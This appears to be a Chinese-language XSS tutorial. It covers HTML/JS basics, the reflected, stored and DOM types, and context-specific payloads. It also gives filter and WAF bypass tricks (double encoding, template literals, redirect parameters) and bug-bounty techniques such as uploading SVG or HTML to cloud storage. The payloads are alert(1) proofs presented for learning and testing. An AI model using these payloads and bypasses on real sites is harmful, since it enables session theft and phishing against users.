## 前置基础：XSS 需要懂哪些前端知识？

为了更好理解 XSS，我会先快速讲解一些**基础的前端知识**，哪怕你没写过网页也能跟上。

### 1. HTML 是什么？

- HTML 是网页的“结构语言”，网页上的内容几乎都是用 HTML 描述的。
- 页面会由一个个标签构成，比如：

```html
<html>
  <head><title>网页标题</title></head>
  <body>
    <h1>主标题</h1>
    <p>这是正文段落</p>
  </body>
</html>
```

![image-20250719012824925](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250719012824925.png)

看到这种 `<标签>` 的东西，就是 HTML。

### 2. HTML 标签的结构：

```html
<tagname attribute="value">内容</tagname>
```

例如：

```html
<a href="https://example.com">点我跳转</a>
```

`<a>` 是超链接标签，`href` 是属性，里面是跳转地址，标签中间是显示的内容。

### 3. 常见标签（可能被注入）：

| 标签               | 用途         | XSS 利用方式                 |
| ------------------ | ------------ | ---------------------------- |
| `<script>`         | 插入 JS 脚本 | 可直接运行 alert() 等        |
| `<img>`            | 插图         | 利用 onerror 事件            |
| `<a>`              | 超链接       | `javascript:` 伪协议执行脚本 |
| `<input>`          | 表单输入     | 值可能被注入                 |
| `<div>` / `<span>` | 内容容器     | 可注入事件属性               |
| `<iframe>`         | 内嵌网页     | 利用 srcdoc、onload 等       |
| `<svg>` / `<math>` | 特殊标签     | 可触发 onload/onbegin        |

### 4. JavaScript 是什么？

- JavaScript 是让网页“动起来”的语言。
- 主要运行在浏览器中，XSS 就是利用 JS 来实现攻击。

### 5. XSS 常用 JS 函数：

xss中常用的函数：

| 函数                         | 说明                | 举例                  |
| ---------------------------- | ------------------- | --------------------- |
| `alert()`                    | 弹出提示框          | `alert(1)` 检测注入点 |
| `console.log()`              | 打印日志            | 用于调试              |
| `document.cookie`            | 获取当前页面 Cookie | 常用于窃取登录态      |
| `location.href`              | 当前网址，可跳转    | 用于钓鱼跳转          |
| `document.write()`           | 向页面写入内容      | 可插入脚本            |
| `eval()`                     | 执行字符串代码      | 高危函数              |
| `setTimeout()`               | 延迟执行代码        | 配合 payload 使用     |
| `fetch()` / `XMLHttpRequest` | 发送 HTTP 请求      | 向远程服务器传数据    |

### 6. 可被 XSS 利用的 HTML 属性（事件触发点）

这些 HTML 属性可以“绑定 JS 代码”，XSS 就喜欢钻它们的空子：

| 属性          | 说明                                                        |
| ------------- | ----------------------------------------------------------- |
| `onerror`     | 加载资源失败触发，例如 `<img src=x onerror=alert(1)>`       |
| `onclick`     | 点击触发，例如 `<div onclick=alert(1)>点我</div>`           |
| `onload`      | 页面加载时触发，例如 `<svg onload=alert(1)>`                |
| `onmouseover` | 鼠标悬停触发，例如 `<div onmouseover=alert(1)>划一下</div>` |
| `onfocus`     | 输入框获得焦点时触发                                        |
| `oninput`     | 输入变化时触发                                              |

### 7. 什么是上下文（Context）？

理解上下文可以帮我们知道**代码会被当成什么解释**：

- HTML 上下文：代码会被当成普通标签或内容 → 可尝试插 `<script>`、`<img>` 等
- JS 上下文：输入被当成 JS 字符串或变量 → 要闭合引号并插入脚本
- 属性上下文：输入在 HTML 属性中 → 要闭合引号再加事件

`<input value="你的输入">`  ← 属性上下文

`<script>var name = "{{input}}"</script>` ← JS 字符串上下文

### 小结

- 如果你能看懂 HTML 和 JS 的结构
- 能理解“代码在哪个位置会怎么执行”

你就能搞懂 XSS 的原理，也能更好的构造出payload

## 前置基础：什么是“跨站”？

1. 这里的“跨站”其实并不一定非要从别的网站跳到这个站，而是：**攻击者注入代码 → 由其他用户触发 → 在目标网站上执行攻击者的脚本。**

2. 为什么叫“跨”？因为攻击者的代码和目标网站原本不是同一个来源，却被“跨”过来了，等于绕过了浏览器的同源策略。恶意脚本是由攻击者（外部来源）编写并注入的，并非目标网站开发者（可信来源）编写的合法代码。

3. 浏览器实施**同源策略**（SOP）的主要目的是防止不同源的脚本互相访问对方的资源。XSS攻击的**狡猾之处**在于：它让恶意脚本**伪装**成了目标网站自身来源的脚本，浏览器信任目标网站来源的脚本，因此恶意脚本在目标网站的上下文执行时，SOP允许它**完全访问该源下的所有资源**（用户的Cookie、DOM、LocalStorage、发起请求到该源的API等）。

4. 举例说明：

- A 网站的留言区没过滤，攻击者写入 `<script>stealCookiePayload</script>`。
- B 用户来访问 A 网站的留言区时，这段代码在 B 的浏览器中执行了。
- 脚本读取了 B 的 cookie，发回攻击者。

所以：XSS中跨站的本质是 → **“让别人的浏览器执行我写的代码”**。浏览器以为这些代码是 A 网站的合法代码，于是就信任它，从而导致严重后果。

## 1. 什么是 XSS？

**XSS 全称：Cross Site Scripting（跨站脚本攻击）**

> **一句话理解：** XSS 就是把脚本代码“插”进网页里，骗别人浏览并触发这段代码。

**举个例子**

你在页面留言板发一条评论：

```javascript
<script>alert('你中招了')</script>
```

如果网站没做防护，其他用户打开页面时就会弹窗。

### 目的

- 窃取 Cookie / Token（劫持身份）
- 假冒用户操作（钓鱼 / 自动发帖）
- 执行攻击者指定的JS脚本
- 绕过权限、获取内网数据（配合 CSRF 等）

### 攻击流程

1. 攻击者提交一段脚本代码到网站；
2. 网站没有过滤/转义这段代码；
3. 其他用户访问页面时，浏览器执行了攻击者的代码；
4. 攻击者实现数据窃取、操作伪造等目的。

## 3. XSS 的三种类型

XSS 主要分为三种类型：**反射型、存储型、DOM 型**。

### 反射型

- 攻击代码出现在 URL 参数中；
- 页面加载时原样反射在页面上并被执行；
- 一般用于“一次性攻击链接”。

```html
http://example.com/search?q=<script>alert(1)</script>
```

```html
<p>你搜索的是：<script>alert(1)</script></p>
```

### 存储型

- 攻击代码被存入数据库（如评论、昵称、个人签名）；
- 页面每次访问时都会加载并执行；
- 危害最大、最常见于留言区、论坛、用户资料。

例如攻击者提交评论内容为：

```html
<script>alert('XSS')</script>
```

其他人访问页面时自动执行JS。

### DOM 型

- 没有服务器参与，“漏洞”在前端 JS 中；
- 攻击代码通过 URL、hash、input 注入；
- 页面前端自己用 location.hash、innerHTML 等动态渲染html元素不当操作引起漏洞。

```javascript
// 前端页面中的代码：
let q = location.hash.substring(1); // 获取URL中“#”开头的片段
																		// http://example.com/#hello
																		// console.log(location.hash);  // 输出：#hello
																		// location.hash.substring(1) 则是把 # 去掉，得到："hello"
document.getElementById("result").innerHTML = q;
```

url输入：

```
http://example.com/#<img src=1 onerror=alert(1)>
```

## 4. 如何触发XSS

触发XSS第一步：打出alert(1)，这代表你成功得到了前端 JS 执行权限。

### 常见 payload

```html
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<a href="javascript:alert(1)">点我触发</a>
<meta/http-equiv="refresh"/content="5;url=javascript:alert(1)>
```

### 测试建议

- 找到你输入的内容会在页面上显示的部分
- 先输入`<script>alert(1)</script>`查看是否弹窗、WAF拦截、输入内容被转义
- 把页面前端源代码和请求过程都观察一遍，或者观察输入的内容在前端中如何显示，常见触发点`location.href`、`location.replace`、`window.ioen`、`eval`、`postmessage`、`innerHTML`、JavaScript格式化字符串(反引号``)

**更多payload可见**：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## 5. XSS绕过技巧

XSS 很少直接给你 `<script>alert(1)</script>` 就能执行。**过滤机制**是关键难点。

### 常见过滤策略

| **类型**     | **示例**          | **绕过方式**                                                 |
| ------------ | ----------------- | ------------------------------------------------------------ |
| 特殊符号过滤 | 过滤 `<`, `>`     | 使用 URL 编码，如 `%3Cscript%3E`                             |
| 黑名单过滤   | 只过滤 `<script>` | 用 `<img onerror>` 绕过                                      |
| 标签关闭检查 | 自动加上 `</div>` | 用标签闭合绕过，如 `<div><img>`                              |
| 属性值加引号 | `<img src="...">` | 利用事件属性、闭合引号，如当src后内容可控，输入`" onerror=alert(1)><` |

### 其他绕过技巧

- 空格用多种方式替代：`/**/`,` %20`,`+`
- 大小写混写：ScRipT, AlErT
- HTML 实体编码：`&#x3C`; 表示 <
- 多种 payload 测试组合：

```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

## 6. 如何识别和构造 XSS

### Step1 找注入点

| **场景**      | **说明**                               | **示例**                                 |
| ------------- | -------------------------------------- | ---------------------------------------- |
| 搜索框        | 输入的关键词是否出现在结果页面中       | 输入 123，页面显示“您搜索了 123”         |
| URL 参数      | 查看浏览器地址中的参数是否被页面使用   | URL: ...?msg=hi，页面显示“hi”            |
| 表单 / 输入框 | 提交后页面是否显示提交内容             | 留言板、评论区                           |
| 页面跳转链接  | 用户名、跳转地址是否参与链接生成       | 点击后跳转：<a href="next?to={{input}}"> |
| 富文本编辑器  | 如果是富文本，可能接受 HTML 格式的内容 | 如 <b>加粗</b> 正常显示                  |
| ...           | ...                                    | ...                                      |

### Step2 看上下文

HTML 中？JS 中？属性中？

| **上下文类型** | **页面中常见位置**                   | **示例位置**         | **建议 payload**                   |
| -------------- | ------------------------------------ | -------------------- | ---------------------------------- |
| HTML 内容      | `<div>{{input}}</div>`               | 普通内容区域         | `<img src=x onerror=alert(1)>`     |
| HTML 属性      | `<input value="{{input}}">`          | 被插入在标签属性里   | `" autofocus onfocus=alert(1) x="` |
| JavaScript     | `<script>var a="{{input}}"</script>` | 被插入到 JS 字符串中 | `";alert(1);//`                    |

### Step3 尝试基础 payload

| **类型**        | **Payload**                              | **说明**                       |
| --------------- | ---------------------------------------- | ------------------------------ |
| `<script>` 标签 | `<script>alert(1)</script>`              | 经典语法，仅在 HTML 上下文有效 |
| `<img>` 标签    | `<img src="/1" onerror=alert(1)>`        | 资源加载失败会触发 onerror     |
| `<svg>` 标签    | `<svg/onload=alert(1)>`                  | SVG 标签可嵌入脚本             |
| 属性注入        | `" autofocus onfocus=alert(1) x="`       | 利用 HTML 属性注入触发事件     |
| URL 注入        | `<a href="javascript:alert(1)">点我</a>` | javascript: 协议调用代码       |

### Step4 逐步构造绕过

如果基础 payload 被过滤或不执行，需要**逐步调试、尝试绕过技巧**。

**案例一：**页面不显示输入内容？

页面源码：

```html
<div>Hello {{input}}</div>
```

输入：

```html
<script>alert(1)</script>
```

页面显示：

```
Hello 
```

可能被过滤了 script 关键词

可以将payload改成其他标签的xss的payload：

```html
<svg/onload=alert(1)>
```

如果成功弹窗，说明过滤只是黑名单

**案例二：**标签自动闭合

页面源码：

```html
<p>留言：{{input}}</p>
```

输入：

```html
</p><script>alert(1)</script><p>
```

形成结构：

```html
<p>留言：</p><script>alert(1)</script><p></p>
```

闭合原本的标签 → 插入脚本 → 再恢复结构

**案例三：**属性上下文闭合

```html
<input value="{{input}}">
```

输入：

```html
" onfocus=alert(1) autofocus x="
```

最终变成：

```html
<input value="" onfocus=alert(1) autofocus x="">
```

## 7. 进阶绕过技巧：Unicode + HTML 双重编码绕过

在某些 Web 环境中，WAF会尝试检测危险内容（如 javascript: 协议），但由于编码解码处理顺序问题，**我们可以巧妙绕过检测**。

### 背景场景：

前提条件：

- 请求数据是 JSON 格式传输；
- 输入被插入到 HTML 属性中，例如：

```html
<a href="{{input}}">点击跳转</a>
```

WAF 会在服务端检测关键字（如 javascript:），但检测前会进行一次解码；

我们可以利用这个顺序实现绕过。

### 绕过原理：

1. **构造 payload：**
   - 将 `javascript:` 先进行 HTML 编码 → `javascript:` → `javascript&#x3A;`
   - 再将这个 HTML 编码后的字符串进行 Unicode 编码 → 结果是双重编码字符串。
2. **服务端处理顺序：**
   - WAF 先做 Unicode 解码 → 变成 `javascript&#x3A;`；
   - 然后再检测，但此时不是原始的 javascript:，绕过了检测；
   - 最终被当成 HTML 内容渲染时，浏览器会再解码 `&#x3A;` →` :`
3. **浏览器执行时被解析为:**

```html
<a href="javascript:alert(1)">点击跳转</a>
```

即可成功触发xss

### 注意事项：

| **注意点**                 | **描述**                                                     |
| -------------------------- | ------------------------------------------------------------ |
| 浏览器自动解码行为         | 浏览器会自动处理 HTML 实体 → `&#x3A;` → `:`                  |
| WAF 解码顺序               | 如果 WAF 先解 Unicode，再判断，就可以被绕过                  |
| 插入位置必须是 HTML 属性中 | 如 href、src 等，才能利用浏览器执行链接协议（如` javascript:`） |

## 8. SRC挖掘中XSS利用

相较于CTF中拿到flag的目的性，SRC更加注重漏洞造成的危害，因此攻击手法面更广

除了前面所说的普通的XSS，SRC中一些技巧：

### url跳转xss

url跳转是一种常见的Web安全问题，攻击者可以利用该漏洞将用户从受信任的网站重定向到恶意网站，从而实施钓鱼攻击、信息窃取或恶意软件下载等。

若过滤不严，也可以被我们利用来触发XSS：

`https://example.com/redirect?url=javascript:alert(1);`

如果限制了url，假设必须跳转到baidu.com

`https://example.com/redirect?url=javascript://www.baidu.com/?%250aalert(1);`

使用%250a是因为`location.href`、`location.replace`、`window.ioen`三个写法会双重解码（第一次解码，传入后的url进行一次解码，跳转时会被当作url再被解码一次）

`%250a`其中`%25`解码后是`%`

### **格式化字符串**

`https://example.com?url=${alert(1)}`

XSS 不只是出现在 HTML 标签中，有时用户输入被直接写进 JavaScript 代码里，就形成了 **JavaScript 上下文中的 XSS**。

**单引号包裹用户输入**

```html
<script>
  const name = "<?php echo $_GET['name'] ?>";
  alert(name);
</script>
```

如果用户输入:`example.com/page.php?name=";</script><script>alert(1)</script>`

页面会变成：

```html
<script>
  const name = ""; </script><script>alert(1)</script>
```

**多行模版字符串中的XSS**

当输入内容被插入到多行语句中

```html
<script>
  const name = `
    Hello,
    <?php echo $_GET['name'] ?>
  `;
  alert(name);
</script>
```

这段代码使用了 JS 的模板字符串（用 ``` 包裹），允许写多行字符串。

此时攻击者传入此前的payload就会导致报错，但是此时攻击者就可以利用：

```javascript
name=${alert(1)}
```

页面变成：

```javascript
<script>
  const name = `
    Hello,
    ${alert(1)}
  `;
  alert(name);
</script>
```

JavaScript 执行时会把 ${alert(1)} 替换为真正执行结果 → 正常弹窗

### 云存储导致的XSS

上传xss到云存储桶上，但是前提是有cdn把可信域名解析到云存储的域名上（否则也是因为同源策略无法打大危害）

上传时修改Content-Type:

```html
text/html
text/xml
image/svg+xml
text/xsl
application/xml
```

这是因为有的云存储解析上传的文件时，可能是通过Content-Type来判断文件类型。同理如果是通过后缀或文件头等因素判断，需要使用相应的方式进行绕过，让上传的文件通过我们想要的文件格式进行解析。

### 一个小技巧

比较大型的互联网公司的XSS通常不会直接被解析，都会进行一定的防护。需要细心查找，在其他地方查看我们插入的内容是否被解析。例如修改一个介绍内容时，在修改页面没有被解析，但是在操作日志中这个payload就被解析了。

